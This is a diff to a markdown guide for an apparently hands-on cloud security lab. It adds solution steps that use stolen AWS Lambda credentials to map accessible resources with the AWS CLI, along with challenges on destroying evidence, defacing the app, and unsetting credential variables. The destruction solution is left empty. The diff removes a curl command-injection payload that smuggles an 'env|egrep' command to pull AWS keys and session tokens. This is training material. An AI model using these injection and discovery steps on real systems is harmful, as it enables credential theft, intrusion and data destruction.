@@ -16,6 +16,7 @@
 * Continue to use command injection to acquire **cloud credentials** used by AWS Lambda function
 * Discover what resources these newly-acquired credentials have access to
 * Destroy all evidence and deface evidence-app web page
+* Unset credential-related environment variables
 
 ## Challenges
 
@@ -91,6 +92,123 @@ Use your knowledge of how you can conduct command injection against this vulnera
 
 ### Challenge 2: Perform Discovery in Cloud Account
 
+Now that you are armed with credentials, see which account you compromised, get a lay of the land, and see which resource types you now have access to.
+
+??? cmd "Solution"
+
+    1. The first task is to determine who these credentials belong to. You can determine this quite easily by using the AWS CLI tools available in your **CloudShell** session. The first command you will use is:
+
+        ```bash
+        aws sts get-caller-identity
+        ```
+
+        !!! summary "Solution"
+
+            ```bash
+            {
+                "UserId": "AROATAI5Z633T7ULOW742:evidence",
+                "Account": "012345678910",
+                "Arn": "arn:aws:sts::012345678910:assumed-role/EvidenceLambdaRole/evidence"
+            }
+            ```
+
+    2. You have now verified that you stole credentials from a Lambda function. You also see the name of the role (`EvidenceLambdaRole`). Now, attempt to see which permissions this Lambda role may have by executing the following command:
+
+        ```bash
+        aws iam list-attached-role-policies --role-name EvidenceLambdaRole
+        ```
+
+        !!! summary "Expected Results"
+
+            ```An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation: User: arn:aws:sts::012345678910:assumed-role/EvidenceLambdaRole/evidence is not authorized to perform: iam:ListAttachedRolePolicies on resource: role EvidenceLambdaRole because no identity-based policy allows the iam:ListAttachedRolePolicies action```
+
+    3. This comes up empty as the role does not have rights to view its own permissions. The next logical step would be to try some of the more common AWS CLI commands that an attacker may try to gain access to critical or sensitive cloud resources.
+
+        ```bash
+        aws ec2 describe-instances
+        ```
+
+        !!! summary "Solution"
+
+            ```An error occurred (UnauthorizedOperation) when calling the DescribeInstances operation: You are not authorized to perform this operation.```
+
+        ```bash
+        aws rds describe-db-instances
+        ```
+
+        !!! summary "Solution"
+
+            ```An error occurred (AccessDenied) when calling the DescribeDBInstances operation: User: arn:aws:sts::012345678910:assumed-role/EvidenceLambdaRole/evidence is not authorized to perform: rds:DescribeDBInstances on resource: arn:aws:rds:us-east-1:012345678910:db:* because no identity-based policy allows the rds:DescribeDBInstances action```
+
+        ```bash
+        aws s3 ls
+        ```
+
+        !!! summary "Solution"
+
+            ```bash
+            2022-07-10 14:34:30 aws-logs-ev6hyhqiwb0duypb
+            2022-07-10 14:34:30 cloudtrail-ev6hyhqiwb0duypb
+            2022-07-10 14:34:30 evidence-ev6hyhqiwb0duypb
+            2022-07-10 14:34:30 webcode-ev6hyhqiwb0duypb
+            ```
+
+    4. After some trial-and-error, you can that you can utilize the `ListBuckets` API call with these stolen credentials. Set the `WEBCODE_BUCKET` and `EVIDENCE_BUCKET` environment variables to the names of the buckets beginning with `evidence-` and `webcode-`, respectively, as you will interact with these buckets a few times in the next challenge. Here is some Bash Kung Fu to do just that:
+
+        ```bash
+        EVIDENCE_BUCKET=$(aws s3 ls | egrep -o evidence-.*)
+        WEBCODE_BUCKET=$(aws s3 ls | egrep -o webcode-.*)
+        echo "The evidence bucket is: $EVIDENCE_BUCKET"
+        echo "The webcode bucket is:  $WEBCODE_BUCKET"
+        ```
+
+        !!! summary "Expected Results"
+
+            ```bash
+            The evidence bucket is: evidence-ev6hyhqiwb0duypb
+            The webcode bucket is:  webcode-ev6hyhqiwb0duypb
+            ```
+
 ### Challenge 3: Destruction and Defacement
 
-```curl -X POST https://d1dw3pytnie47k.cloudfront.net/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"file_name":";env|egrep \"(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)\"","file_data":"dGVzdAo="}'```
+One of the bucket names that you uncovered in the last challenge begins with the text `webcode-`. This is the static web content for the **evidence-app**. Normally, penetration tests may go the route of adding or modifying a single file to "prove the point" that unapproved and privileged access was achieved.
+
+Since this is a development environment, you can create more "shock and awe". Delete all of the evidence from the from S3 and deface the **evidence-app** web page.
+
+??? cmd "Solution"
+
+    1. Since you have `ListBuckets` access, see if you can list the contents of the `evidence-` bucket to see the uploaded evidence files.
+
+        ```bash
+        
+        ```
+
+### Challenge 4: Unset Environment Variables
+
+So that the next series of challenges are successful (you will be acting as a defender), unset the `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN` environment varibles so that your current IAM user's credentials are used.
+
+??? cmd "Solution"
+
+    1. In your **CloudShell** session, run the following commands to unset your AWS credential-related environment variables:
+
+        ```bash
+        unset AWS_ACCESS_KEY_ID
+        unset AWS_SECRET_ACCESS_KEY
+        unset AWS_SESSION_TOKEN
+        ```
+
+    2. Verify that you can still access AWS using the CLI tools and are the correct user.
+
+        ```bash
+        aws sts get-caller-identity
+        ```
+
+        !!! summary "Expected Results"
+
+            ```bash
+            {
+                "UserId": "012345678910",
+                "Account": "012345678910",
+                "Arn": "arn:aws:iam::012345678910:root"
+            }
+            ```
